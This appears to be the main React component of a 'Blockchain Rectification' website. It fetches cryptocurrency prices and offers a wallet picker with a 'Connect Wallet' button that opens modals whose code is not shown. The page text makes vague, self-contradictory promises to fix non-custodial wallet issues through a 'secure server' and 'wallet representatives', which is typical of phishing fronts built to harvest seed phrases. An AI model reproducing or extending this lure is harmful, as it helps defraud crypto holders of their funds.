import React, { useState, useEffect } from "react";
import axios from "axios";
import { Button, Typography, Box, Container, Stack } from "@mui/material";
import { styled } from "@mui/system";
import "./App.css";
import Categories from "./categories";
import WalletbaseModal from "./walletbasemodal";
import WalletSelectionModal from "./walletselectionmodal";
import { SelectMinimal } from "./mui-treasury/select-minimal";
import { createTheme, ThemeProvider } from "@mui/material/styles";
import CryptoCarousel from "./cryptocarousel";
import { wallets } from "./utility/wallets";
import HomeFooter from "./Homefooter";
import Cryptowallet from "./assets/Cryptowallet.png";
import Partners from "./components/partners";
import { Route, Routes } from "react-router-dom";
import PrivacyPolicy from "./policies/privacyPolicy";
import TermsOfService from "./policies/termsOfService";
import CookieBanner from "./components/modals/cookieBanner";

const theme = createTheme({
  typography: {
    fontFamily: "Poppins, sans-serif",
  },
  components: {
    MuiTypography: {
      styleOverrides: {
        h1: {
          fontFamily: '"Passion One", sans-serif',
          fontWeight: 700,
          fontSize: "8rem",
          color: "#3498db",
          marginBottom: "30px",
          textAlign: "center",
          wordBreak: "break-word",
        },
      },
    },
  },
});

const StyledButton = styled(Button)(({ theme }) => ({
  color: "#3498db",
  borderRadius: "22px",
  padding: "14px 20px",
  fontSize: "0.9rem",
  backgroundColor: "#3498db",
  height: "56px",
  minWidth: "200px",
  "&:hover": {
    backgroundColor: "#2980b9",
  },
}));

function MainContent({
  cryptocurrencies,
  selectedWallet,
  handleWalletChange,
  handleConnectWallet,
  openWalletbaseModal,
  handleCloseWalletbaseModal,
  openWalletSelectionModal,
  handleCloseWalletSelectionModal,
  handleSelectWallet,
  handleOpenWalletSelectionModal,
}) {
  return (
    <Box sx={{ bgcolor: "#0f1724", color: "white", minHeight: "100vh" }}>
      <CryptoCarousel cryptocurrencies={cryptocurrencies} />
      <Container
        maxWidth="lg"
        sx={{
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
        }}
      >
        <Box
          sx={{
            textAlign: "center",
            maxWidth: 1000,
            width: "100%",
            px: 2,
            mt: { xs: 7, md: 8 },
            position: "relative",
          }}
        >
          <Typography
            variant="h1"
            sx={{
              mt: { md: 5 },
              fontSize: { xs: "3.3rem", sm: "5rem", md: "8rem" },
              lineHeight: { xs: 1.2, sm: 1.1, md: 1 },
            }}
          >
            Blockchain Rectification
          </Typography>
          <Typography variant="body1" sx={{ mb: 2 }}>
            Blockchain technology makes this new approach to digital ownership
            possible. Open and decentralized protocol for syncing various
            Wallets issues on Secure Server.
          </Typography>
          <Typography variant="body1" sx={{ mb: 2 }}>
            This is not an app but a protocol that establishes a remote
            resolution between all noncustodial wallet. It is an online server
            which gets you across to every wallet representative to enable
            effective complain and rectification of issues.
          </Typography>
          <Typography
            variant="body1"
            sx={{
              mb: 2,
              color: "#3498db",
              fontWeight: "bold",
            }}
          >
            This is a protocol that supports a number crypto networks with
            unlimited token support. No account sign-up is required because it
            all runs locally on your device.
          </Typography>
          <Stack
            direction={{ xs: "column", sm: "row" }}
            spacing={{ xs: 2, sm: 2 }}
            justifyContent="center"
            sx={{ mt: 4 }}
          >
            <SelectMinimal
              value={selectedWallet ? selectedWallet.id : ""}
              onChange={handleWalletChange}
              menuItems={wallets.map((wallet) => ({
                value: wallet.id,
                label: wallet.name,
              }))}
              sx={{
                minWidth: { xs: "100%", sm: "auto" },
                "& .MuiSelect-select": {
                  fontSize: { xs: "0.8rem", sm: "0.9rem" },
                },
              }}
            />
            <StyledButton onClick={handleConnectWallet}>
              <Typography
                variant="caption"
                noWrap
                sx={{
                  color: "white",
                  fontSize: "15px",
                  textTransform: "capitalize",
                }}
              >
                Connect Wallet
              </Typography>
            </StyledButton>
          </Stack>
        </Box>
        <Partners />
        <Categories />

        <WalletbaseModal
          open={openWalletbaseModal}
          onClose={handleCloseWalletbaseModal}
          onOpenWalletSelection={handleOpenWalletSelectionModal}
        />

        <WalletSelectionModal
          open={openWalletSelectionModal}
          onClose={handleCloseWalletSelectionModal}
          onSelectWallet={handleSelectWallet}
        />
      </Container>
      <Box
        sx={{
          display: "flex",
          flexDirection: { xs: "column", md: "row" },
          alignItems: "center",
          justifyContent: "center",
          mb: 4,
          mx: "auto",
          textAlign: { xs: "center", md: "left" },
        }}
      >
        <Box
          sx={{
            width: { xs: 250, md: 400 },
            height: { xs: 250, md: 400 },
            borderRadius: "12px",
            display: "flex",
            justifyContent: "center",
            alignItems: "center",
            mr: { md: 4 },
            mb: { xs: -5, md: 0 },
          }}
        >
          <img
            src={Cryptowallet}
            style={{
              width: "100%",
              height: "100%",
              objectFit: "contain",
            }}
          />
        </Box>

        <Typography
          variant="body1"
          sx={{
            fontSize: { xs: "0.7rem", md: "1.2rem" },
            color: "white",
            maxWidth: { xs: "90%", md: "50%" },
          }}
        >
          Every step forward is a step towards innovation. Stay secure, stay
          informed, and continue to explore the endless possibilities that the
          digital realm has to offer.
        </Typography>
      </Box>
      <HomeFooter />
    </Box>
  );
}

function App() {
  const [cryptocurrencies, setCryptocurrencies] = useState([]);
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [openWalletbaseModal, setOpenWalletbaseModal] = useState(false);
  const [openWalletSelectionModal, setOpenWalletSelectionModal] = useState(false);

  useEffect(() => {
    fetchCryptocurrencies();
  }, []);

  const fetchCryptocurrencies = async () => {
    try {
      const response = await axios.get(
        "https://api.coingecko.com/api/v3/coins/markets",
        {
          params: {
            vs_currency: "usd",
            ids: "bitcoin,ethereum,binancecoin,ripple,cardano,solana,polkadot,dogecoin,tether,usd-coin,avalanche-2,chainlink,matic-network,stellar,cosmos,algorand",
            order: "market_cap_desc",
            per_page: 16,
            page: 1,
            sparkline: false,
            price_change_percentage: "1h",
          },
        }
      );
      setCryptocurrencies(response.data);
    } catch (error) {
      console.error("Error fetching cryptocurrency data:", error);
    }
  };

  const handleWalletChange = (event) => {
    setSelectedWallet(
      wallets.find((wallet) => wallet.id === event.target.value)
    );
  };

  const handleConnectWallet = () => {
    setOpenWalletbaseModal(true);
  };

  const handleCloseWalletbaseModal = () => {
    setOpenWalletbaseModal(false);
  };

  const handleCloseWalletSelectionModal = () => {
    setOpenWalletSelectionModal(false);
  };

  const handleSelectWallet = (wallet) => {
    setSelectedWallet(wallet);
    setOpenWalletSelectionModal(false);
  };

  const handleOpenWalletSelectionModal = () => {
    setOpenWalletbaseModal(false);
    setOpenWalletSelectionModal(true);
  };

  return (
    <ThemeProvider theme={theme}>
      <Routes>
        <Route
          path="/"
          element={
            <MainContent
              cryptocurrencies={cryptocurrencies}
              selectedWallet={selectedWallet}
              handleWalletChange={handleWalletChange}
              handleConnectWallet={handleConnectWallet}
              openWalletbaseModal={openWalletbaseModal}
              handleCloseWalletbaseModal={handleCloseWalletbaseModal}
              openWalletSelectionModal={openWalletSelectionModal}
              handleCloseWalletSelectionModal={handleCloseWalletSelectionModal}
              handleSelectWallet={handleSelectWallet}
              handleOpenWalletSelectionModal={handleOpenWalletSelectionModal}
            />
          }
        />
        <Route path="/privacy-policy" element={<PrivacyPolicy />} />
        <Route path="/terms-of-service" element={<TermsOfService />} />
      </Routes>
      <CookieBanner />
    </ThemeProvider>
  );
}

export default App;